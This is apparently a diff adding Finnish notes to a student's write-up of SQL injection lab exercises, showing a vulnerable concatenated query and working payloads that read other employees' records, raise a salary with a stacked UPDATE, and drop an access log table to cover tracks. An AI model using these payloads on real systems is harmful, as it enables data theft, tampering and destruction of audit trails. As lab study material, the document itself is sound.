@@ -172,6 +172,40 @@ Näin ollen palautettiin user_data mikäli login_count = 0 JA userid = 0 TAI 1 =
 
 ![image](https://user-images.githubusercontent.com/71498717/197784877-e0c78026-0c49-44b9-9a8f-3595f01f41f5.png)
 
+Seuraavassa kohdassa pääset katsomaan omia tietoja firman järjestelmässä tarvitset oman nimen ja TAN numeron. Kysely on muodossa
+``` "SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "'; ```
+
+Lisäämällä nimeksi minkätahansa ja TAN numeroksi  ```3SL99A' OR '1' = '1 ```
+
+Tulee kyselystä seuraavanlainen
+
+``` "SELECT * FROM employees WHERE last_name = 'Smith' AND auth_tan = '3SL99A' OR '1' = '1'; ```
+
+Ja pääset näkemään kollegoiden tiedot
+
+![image](https://user-images.githubusercontent.com/71498717/197787736-bc717237-8c9d-45e5-83fe-0d56cdf2bd9e.png)
+
+Nyt on tarkoitus muokata omaa palkkaa ja kysely pysyy samana eli
+
+``` "SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "'; ```
+
+Kun muokataan jälleen auth_tan kohtaa sopivilla komennoilla saadaan palkka nousemaan
+
+``` "SELECT * FROM employees WHERE last_name = 'Smith' AND auth_tan = 3SL99A'; UPDATE employees SET SALARY = '88000' WHERE AUTH_TAN = '3SL99A; ```
+![image](https://user-images.githubusercontent.com/71498717/197791111-11ca9998-1484-4dd7-8a09-27d599d16599.png)
+
+Viimeisessä kohdassa pyyhitään jäljet pudottamalla access_log. Itse saat kirjoittaa mitä action sisältää.
+
+``` nothing ' ; DROP TABLE access_log;' ```
+
+Tätä yritin monesti ja ei toiminut, mutta 
+
+``` nothing ' ; DROP TABLE access_log;-- ```
+
+Toimi, koska ilmeisesti -- lisäämällä loppuun kyselyn loppuosa muuttuu kommentiksi jolloin ' ja muitten määrän ei tarviste täsmätä tai mitä kyselyn jälkeen lukeekaan ei lueta ajettavaan komentoon.
+
+![image](https://user-images.githubusercontent.com/71498717/197802436-ff24e95a-9412-4ff9-a9ff-faede6a8c12f.png)
+
 
 # H
 # X
